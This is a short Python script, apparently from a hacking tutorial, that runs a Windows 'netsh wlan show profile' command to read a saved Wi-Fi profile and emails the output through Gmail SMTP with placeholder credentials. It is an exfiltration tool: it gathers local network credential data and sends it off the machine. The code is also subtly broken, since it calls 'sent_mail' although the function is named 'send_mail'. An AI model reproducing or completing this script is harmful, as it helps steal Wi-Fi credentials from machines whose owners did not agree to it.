#!/usr/bin/env python
import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile TPLING2020"#Windows command, Linux or OSX
result = subprocess.check_output(command, shell=True)
sent_mail("test@gmail.com", "test", result)